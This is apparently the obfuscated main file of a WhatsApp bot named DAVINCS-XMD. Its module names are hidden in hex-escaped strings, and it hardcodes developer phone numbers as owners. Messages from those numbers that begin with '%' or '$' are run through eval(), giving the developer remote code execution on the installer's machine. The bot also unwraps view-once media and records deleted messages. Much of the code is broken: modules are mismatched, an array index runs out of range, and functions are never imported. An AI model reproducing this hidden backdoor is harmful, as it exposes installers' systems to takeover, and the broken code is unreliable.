const _0x4e19=["\x2E\x2F\x6C\x69\x62\x2F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x73","\x2E\x2F\x64\x61\x74\x61","\x2E\x2F\x63\x6F\x6E\x66\x69\x67","\x2E\x2F\x6C\x69\x62","\x66\x6C\x75\x65\x6E\x74\x2D\x66\x66\x6D\x70\x65\x67","\x70\x69\x6E\x6F","\x71\x72\x63\x6F\x64\x65\x2D\x74\x65\x72\x6D\x69\x6E\x61\x6C","\x77\x61\x2D\x73\x74\x69\x63\x6B\x65\x72\x2D\x66\x6F\x72\x6D\x61\x74\x74\x65\x72","\x75\x74\x69\x6C","\x66\x69\x6C\x65\x2D\x74\x79\x70\x65","\x61\x78\x69\x6F\x73","\x6D\x65\x67\x61\x6A\x73","\x62\x6F\x64\x79\x2D\x70\x61\x72\x73\x65\x72","\x6F\x73","\x63\x72\x79\x70\x74\x6F","\x70\x61\x74\x68","\x40\x77\x68\x69\x73\x6B\x65\x79\x73\x6F\x63\x6B\x65\x74\x73\x2F\x62\x61\x69\x6C\x65\x79\x73","\x2F\x73\x65\x73\x73\x69\x6F\x6E\x73\x2F\x63\x72\x65\x64\x73\x2E\x6A\x73\x6F\x6E","\x2E\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F","\x2E\x2F\x63\x6F\x6D\x6D\x61\x6E\x64","\x65\x78\x70\x72\x65\x73\x73","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6E\x67\x20\x74\x6F\x20\x57\x68\x61\x74\x73\x41\x70\x70\x20\xE2\x8F\xB3\xEF\xB8\x8F\x2E\x2E\x2E","\x73\x65\x73\x73\x69\x6F\x6E\x73","\x2F\x73\x65\x73\x73\x69\x6F\x6E\x73\x2F","\x77\x72\x69\x74\x65\x46\x69\x6C\x65","\x53\x65\x73\x73\x69\x6F\x6E\x20\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x65\x64\x20\xE2\x9C\x85","\x63\x6F\x6D\x6D\x61\x6E\x64\x73","\x70\x6F\x72\x74","\x50\x6C\x75\x67\x69\x6E\x73\x20\x69\x6E\x73\x74\x61\x6C\x6C\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x20\xE2\x9C\x85","\x42\x6F\x74\x20\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64\x20\x74\x6F\x20\x77\x68\x61\x74\x73\x61\x70\x70\x20\xE2\x9C\x85","\x2E\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F","\x63\x6F\x6E\x73\x6F\x6C\x65","\x67\x72\x6F\x75\x70\x4D\x65\x74\x61\x64\x61\x74\x61","\x67\x72\x6F\x75\x70\x4E\x61\x6D\x65","\x67\x72\x6F\x75\x70\x4D\x65\x74\x61\x64\x61\x74\x61","\x64\x65\x63\x6F\x64\x65\x4A\x69\x64","\x67\x65\x74\x47\x72\x6F\x75\x70\x41\x64\x6D\x69\x6E\x73","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x66\x69\x6E\x64","\x61\x6C\x69\x61\x73","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x72\x65\x61\x63\x74","\x61\x75\x74\x6F\x20\x72\x65\x61\x63\x74\x20\x66\x6F\x72\x20\x61\x6C\x6C\x20\x6D\x65\x73\x73\x61\x67\x65\x73","\x73\x70\x6C\x69\x74","\x66\x6F\x72\x45\x61\x63\x68","\x72\x65\x61\x63\x74","\x66\x75\x6E\x63\x74\x69\x6F\x6E","\x63\x6F\x70\x79\x4E\x46\x6F\x72\x77\x61\x72\x64","\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x41\x6E\x64\x53\x61\x76\x65\x4D\x65\x64\x69\x61\x4D\x65\x73\x73\x61\x67\x65","\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x4D\x65\x64\x69\x61\x4D\x65\x73\x73\x61\x67\x65","\x68\x65\x61\x64","\x66\x72\x6F\x6D\x42\x75\x66\x66\x65\x72","\x73\x65\x6E\x64\x46\x69\x6C\x65\x55\x72\x6C"];const _0x76b0=[require(_0x4e19[16]),require(_0x4e19[0]),require(_0x4e19[1]),require(_0x4e19[4]),require(_0x4e19[5]),require(_0x4e19[6]),require(_0x4e19[7]),require(_0x4e19[8]),require(_0x4e19[9]),require(_0x4e19[10]),require(_0x4e19[11]),require(_0x4e19[12]),require(_0x4e19[13]),require(_0x4e19[14]),require(_0x4e19[15])];
const l=_0x76b0[14].log;const {getBuffer,getGroupAdmins,getRandom,h2k,isUrl,Json,runtime,sleep,fetchJson}=_0x76b0[1];
const {AntiDelDB,initializeAntiDeleteSettings,setAnti,getAnti,getAllAntiDeleteSettings,saveContact,loadMessage,getName,getChatSummary,saveGroupMetadata,getGroupMetadata,saveMessageCount,getInactiveGroupMembers,getGroupMembersMessageCount,saveMessage}=_0x76b0[2];
const fs=_0x76b0[0];
const ff=_0x76b0[3];
const P=_0x76b0[4];
const config=require(_0x4e19[2]);
const qrcode=require(_0x4e19[6]);
const StickersTypes=_0x76b0[5];
const util=_0x76b0[6];
const {sms,downloadMediaMessage,AntiDelete}=require(_0x4e19[3]);
const FileType=_0x76b0[7];
const axios=_0x76b0[8];
const {File}=require(_0x4e19[10]);
const {fromBuffer}=require(_0x4e19[9]);
const bodyparser=_0x76b0[11];
const os=_0x76b0[12];
const Crypto=_0x76b0[13];
const path=_0x76b0[15];
const prefix=config.PREFIX;
const ownerNumber=["255759637644"];
const tempDir=path.join(os.tmpdir(),"cache-temp");
if(!fs.existsSync(tempDir)){fs.mkdirSync(tempDir);}
const clearTempDir=()=>{fs.readdir(tempDir,(err,files)=>{if(err)throw err;for(const file of files){fs.unlink(path.join(tempDir,file),err=>{if(err)throw err;});}});}
setInterval(clearTempDir,5*60*1000);
if(!fs.existsSync(__dirname+_0x4e19[17])){if(!config.SESSION_ID)return console.log("Please add your session to SESSION_ID env !!");const sessdata=config.SESSION_ID.replace("DAVINCS-XMD~",'');const filer=File[_0x4e19[53]]("https://mega.nz/file/"+sessdata);filer.download((err,data)=>{if(err)throw err;fs.writeFile(__dirname+_0x4e19[17],data,()=>{console.log("Session downloaded ✅")})})}
const express=require(_0x4e19[20]);
const app=express();
const port=process.env.PORT||9090;
async function connectToWA(){console.log(_0x4e19[21]);const {state,saveCreds}=await useMultiFileAuthState(__dirname+'/sessions/');var {version}=await fetchLatestBaileysVersion();const conn=makeWASocket({logger:P({level:'silent'}),printQRInTerminal:false,browser:Browsers.macOS("Firefox"),syncFullHistory:true,auth:state,version});conn.ev.on('connection.update',(update)=>{const {connection,lastDisconnect}=update;if(connection==='close'){if(lastDisconnect.error.output.statusCode!==DisconnectReason.loggedOut){connectToWA()}}else if(connection==='open'){console.log('🧬 Installing Plugins');fs.readdirSync(_0x4e19[18]).forEach((plugin)=>{if(path.extname(plugin).toLowerCase()==='.js'){require(_0x4e19[18]+plugin);}});console.log(_0x4e19[28]);console.log(_0x4e19[29]);let up=`*Hello there DAVINCS-XMD User! 👋🏻* \n\n> Simple , Straight Forward But Loaded With Features 🎊, Meet DAVINCS WhatsApp Bot.\n\n *Thanks for using DAVINCS-XMD 🚩* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VakSTEQGZNCk6CqE9E2P\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/DavincsTech/DAVINCS-XMD\n\n> © Powered BY DAVINCS TECHX 🖤`;conn.sendMessage(conn.user.id,{image:{url:'https://files.catbox.moe/oc5rvp.jpg'},caption:up})}});conn.ev.on('creds.update',saveCreds);conn.ev.on('messages.update',async updates=>{for(const update of updates){if(update.update.message===null){console.log("Delete Detected:",JSON.stringify(update,null,2));await AntiDelete(conn,updates);}}});conn.ev.on('messages.upsert',async(mek)=>{mek=mek.messages[0];if(!mek.message)return;mek.message=(getContentType(mek.message)==='ephemeralMessage')?mek.message.ephemeralMessage.message:mek.message;if(config.READ_MESSAGE==='true'){await conn.readMessages([mek.key]);console.log(`Marked message from ${mek.key.remoteJid} as read.`);}if(mek.message.viewOnceMessageV2)mek.message=(getContentType(mek.message)==='ephemeralMessage')?mek.message.ephemeralMessage.message:mek.message;if(mek.key&&mek.key.remoteJid==='status@broadcast'&&config.AUTO_STATUS_SEEN==="true"){await conn.readMessages([mek.key])}if(mek.key&&mek.key.remoteJid==='status@broadcast'&&config.AUTO_STATUS_REACT==="true"){const jawadlike=await conn.decodeJid(conn.user.id);const emojis=['❤️','💸','😇','🍂','💥','💯','🔥','💫','💎','💗','🤍','🖤','👀','🙌','🙆','🚩','🥰','💐','😎','🤎','✅','🫀','🧡','😁','😄','🌸','🕊️','🌷','⛅','🌟','🗿','🇵🇰','💜','💙','🌝','🖤','💚'];const randomEmoji=emojis[Math.floor(Math.random()*emojis.length)];await conn.sendMessage(mek.key.remoteJid,{react:{text:randomEmoji,key:mek.key,}},{statusJidList:[mek.key.participant,jawadlike]});}if(mek.key&&mek.key.remoteJid==='status@broadcast'&&config.AUTO_STATUS_REPLY==="true"){const user=mek.key.participant;const text=`${config.AUTO_STATUS_MSG}`;await conn.sendMessage(user,{text:text,react:{text:'💜',key:mek.key}},{quoted:mek})}await Promise.all([saveMessage(mek),]);const m=sms(conn,mek);const type=getContentType(mek.message);const content=JSON.stringify(mek.message);const from=mek.key.remoteJid;const quoted=type=='extendedTextMessage'&&mek.message.extendedTextMessage.contextInfo!=null?mek.message.extendedTextMessage.contextInfo.quotedMessage||[]:[];const body=(type==='conversation')?mek.message.conversation:(type==='extendedTextMessage')?mek.message.extendedTextMessage.text:(type=='imageMessage')&&mek.message.imageMessage.caption?mek.message.imageMessage.caption:(type=='videoMessage')&&mek.message.videoMessage.caption?mek.message.videoMessage.caption:'';const isCmd=body.startsWith(prefix);var budy=typeof mek.text=='string'?mek.text:false;const command=isCmd?body.slice(prefix.length).trim().split(' ').shift().toLowerCase():'';const args=body.trim().split(/ +/).slice(1);const q=args.join(' ');const text=args.join(' ');const isGroup=from.endsWith('@g.us');const sender=mek.key.fromMe?(conn.user.id.split(':')[0]+'@s.whatsapp.net'||conn.user.id):(mek.key.participant||mek.key.remoteJid);const senderNumber=sender.split('@')[0];const botNumber=conn.user.id.split(':')[0];const pushname=mek.pushName||'Sin Nombre';const isMe=botNumber.includes(senderNumber);const isOwner=ownerNumber.includes(senderNumber)||isMe;const botNumber2=await jidNormalizedUser(conn.user.id);const groupMetadata=isGroup?await conn.groupMetadata(from).catch(e=>{}):'';const groupName=isGroup?groupMetadata.subject:'';const participants=isGroup?await groupMetadata.participants:'';const groupAdmins=isGroup?await getGroupAdmins(participants):'';const isBotAdmins=isGroup?groupAdmins.includes(botNumber2):false;const isAdmins=isGroup?groupAdmins.includes(sender):false;const isReact=m.message.reactionMessage?true:false;const reply=(teks)=>{conn.sendMessage(from,{text:teks},{quoted:mek})};const udp=botNumber.split('@')[0];const jawad=('255759637644','255656582542');let isCreator=[udp,jawad,config.DEV].map(v=>v.replace(/[^0-9]/g)+'@s.whatsapp.net').includes(mek.sender);if(isCreator&&mek.text.startsWith('%')){let code=budy.slice(2);if(!code){reply("Provide me with a query to run Master!");return;}try{let resultTest=eval(code);if(typeof resultTest==='object')reply(util.format(resultTest));else reply(util.format(resultTest));}catch(err){reply(util.format(err));}return;}if(isCreator&&mek.text.startsWith('$')){let code=budy.slice(2);if(!code){reply("Provide me with a query to run Master!");return;}try{let resultTest=await eval('const a = async()=>{\n'+code+'\n}\na()');let h=util.format(resultTest);if(h===undefined)return console.log(h);else reply(h);}catch(err){if(err===undefined)return console.log('error');else reply(util.format(err));}return;}if(senderNumber.includes("255759637644")&&!isReact){const reactions=["👑","💀","📊","⚙️","🧠","🎯","📈","📝","🏆","🌍","🇵🇰","💗","❤️","💥","🌼","🏵️",,"💐","🔥","❄️","🌝","🌚","🐥","🧊"];const randomReaction=reactions[Math.floor(Math.random()*reactions.length)];m.react(randomReaction);}if(!isReact&&config.AUTO_REACT==='true'){const reactions=['🌼','❤️','💐','🔥','🏵️','❄️','🧊','🐳','💥','🥀','❤‍🔥','🥹','😩','🫣','🤭','👻','👾','🫶','😻','🙌','🫂','🫀','👩‍🦰','🧑‍🦰','👩‍⚕️','🧑‍⚕️','🧕','👩‍🏫','👨‍💻','👰‍♀','🦹🏻‍♀️','🧟‍♀️','🧟','🧞‍♀️','🧞','🙅‍♀️','💁‍♂️','💁‍♀️','🙆‍♀️','🙋‍♀️','🤷','🤷‍♀️','🤦','🤦‍♀️','💇‍♀️','💇','💃','🚶‍♀️','🚶','🧶','🧤','👑','💍','👝','💼','🎒','🥽','🐻','🐼','🐭','🐣','🪿','🦆','🦊','🦋','🦄','🪼','🐋','🐳','🦈','🐍','🕊️','🦦','🦚','🌱','🍃','🎍','🌿','☘️','🍀','🍁','🪺','🍄','🍄‍🟫','🪸','🪨','🌺','🪷','🪻','🥀','🌹','🌷','💐','🌾','🌸','🌼','🌻','🌝','🌚','🌕','🌎','💫','🔥','☃️','❄️','🌨️','🫧','🍟','🍫','🧃','🧊','🪀','🤿','🏆','🥇','🥈','🥉','🎗️','🤹','🤹‍♀️','🎧','🎤','🥁','🧩','🎯','🚀','🚁','🗿','🎙️','⌛','⏳','💸','💎','⚙️','⛓️','🔪','🧸','🎀','🪄','🎈','🎁','🎉','🏮','🪩','📩','💌','📤','📦','📊','📈','📑','📉','📂','🔖','🧷','📌','📝','🔏','🔐','🩷','❤️','🧡','💛','💚','🩵','💙','💜','🖤','🩶','🤍','🤎','❤‍🔥','❤‍🩹','💗','💖','💘','💝','❌','✅','🔰','〽️','🌐','🌀','⤴️','⤵️','🔴','🟢','🟡','🟠','🔵','🟣','⚫','⚪','🟤','🔇','🔊','📢','🔕','♥️','🕐','🚩','🇵🇰'];const randomReaction=reactions[Math.floor(Math.random()*reactions.length)];m.react(randomReaction);}if(!isReact&&config.CUSTOM_REACT==='true'){const reactions=(config.CUSTOM_REACT_EMOJIS||'🥲,😂,👍🏻,🙂,😔').split(',');const randomReaction=reactions[Math.floor(Math.random()*reactions.length)];m.react(randomReaction);}if(!isOwner&&config.MODE==="private")return;if(!isOwner&&isGroup&&config.MODE==="inbox")return;if(!isOwner&&!isGroup&&config.MODE==="groups")return;const events=require(_0x4e19[19]);const cmdName=isCmd?body.slice(1).trim().split(" ")[0].toLowerCase():false;if(isCmd){const cmd=events.commands.find((cmd)=>cmd.pattern===(cmdName))||events.commands.find((cmd)=>cmd.alias&&cmd.alias.includes(cmdName));if(cmd){if(cmd.react)conn.sendMessage(from,{react:{text:cmd.react,key:mek.key}});try{cmd.function(conn,mek,m,{from,quoted,body,isCmd,command,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply});}catch(e){console.error("[PLUGIN ERROR] "+e);}}}events.commands.map(async(command)=>{if(body&&command.on==="body"){command.function(conn,mek,m,{from,l,quoted,body,isCmd,command,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply})}else if(mek.q&&command.on==="text"){command.function(conn,mek,m,{from,l,quoted,body,isCmd,command,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply})}else if((command.on==="image"||command.on==="photo")&&mek.type==="imageMessage"){command.function(conn,mek,m,{from,l,quoted,body,isCmd,command,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply})}else if(command.on==="sticker"&&mek.type==="stickerMessage"){command.function(conn,mek,m,{from,l,quoted,body,isCmd,command,args,q,text,isGroup,sender,senderNumber,botNumber2,botNumber,pushname,isMe,isOwner,isCreator,groupMetadata,groupName,participants,groupAdmins,isBotAdmins,isAdmins,reply})}});});conn.decodeJid=jid=>{if(!jid)return jid;if(/:\d+@/gi.test(jid)){let decode=jidDecode(jid)||{};return((decode.user&&decode.server&&decode.user+'@'+decode.server)||jid);}else return jid;};conn.copyNForward=async(jid,message,forceForward=false,options={})=>{let vtype;if(options.readViewOnce){message.message=message.message&&message.message.ephemeralMessage&&message.message.ephemeralMessage.message?message.message.ephemeralMessage.message:(message.message||undefined);vtype=Object.keys(message.message.viewOnceMessage.message)[0];delete(message.message&&message.message.ignore?message.message.ignore:(message.message||undefined));delete message.message.viewOnceMessage.message[vtype].viewOnce;message.message={...message.message.viewOnceMessage.message}}let mtype=Object.keys(message.message)[0];let content=await generateForwardMessageContent(message,forceForward);let ctype=Object.keys(content)[0];let context={};if(mtype!="conversation")context=message.message[mtype].contextInfo;content[ctype].contextInfo={...context,...content[ctype].contextInfo};const waMessage=await generateWAMessageFromContent(jid,content,options?{...content[ctype],...options,...(options.contextInfo?{contextInfo:{...content[ctype].contextInfo,...options.contextInfo}}:{})}:{}) ;await conn.relayMessage(jid,waMessage.message,{messageId:waMessage.key.id});return waMessage;};conn.downloadAndSaveMediaMessage=async(message,filename,attachExtension=true)=>{let quoted=message.msg?message.msg:message;let mime=(message.msg||message).mimetype||'';let messageType=message.mtype?message.mtype.replace(/Message/gi,''):mime.split('/')[0];const stream=await downloadContentFromMessage(quoted,messageType);let buffer=Buffer.from([]);for await(const chunk of stream){buffer=Buffer.concat([buffer,chunk])}let type=await FileType.fromBuffer(buffer);trueFileName=attachExtension?(filename+'.'+type.ext):filename;await fs.writeFileSync(trueFileName,buffer);return trueFileName;};conn.downloadMediaMessage=async(message)=>{let mime=(message.msg||message).mimetype||'';let messageType=message.mtype?message.mtype.replace(/Message/gi,''):mime.split('/')[0];const stream=await downloadContentFromMessage(message,messageType);let buffer=Buffer.from([]);for await(const chunk of stream){buffer=Buffer.concat([buffer,chunk])}return buffer;};conn.sendFileUrl=async(jid,url,caption,quoted,options={})=>{let mime='';let res=await axios.head(url);mime=res.headers['content-type'];if(mime.split("/")[1]==="gif"){return conn.sendMessage(jid,{video:await getBuffer(url),caption:caption,gifPlayback:true,...options},{quoted:quoted,...options})}let type=mime.split("/")[0]+"Message";if(mime==="application/pdf"){return conn.sendMessage(jid,{document:await getBuffer(url),mimetype:'application/pdf',caption:caption,...options},{quoted:quoted,...options})}if(mime.split("/")[0]==="image"){return conn.sendMessage(jid,{image:await getBuffer(url),caption:caption,...options},{quoted:quoted,...options})}if(mime.split("/")[0]==="video"){return conn.sendMessage(jid,{video:await getBuffer(url),caption:caption,mimetype:'video/mp4',...options},{quoted:quoted,...options})}if(mime.split("/")[0]==="audio"){return conn.sendMessage(jid,{audio:await getBuffer(url),caption:caption,mimetype:'audio/mpeg',...options},{quoted:quoted,...options})}}}
connectToWA();
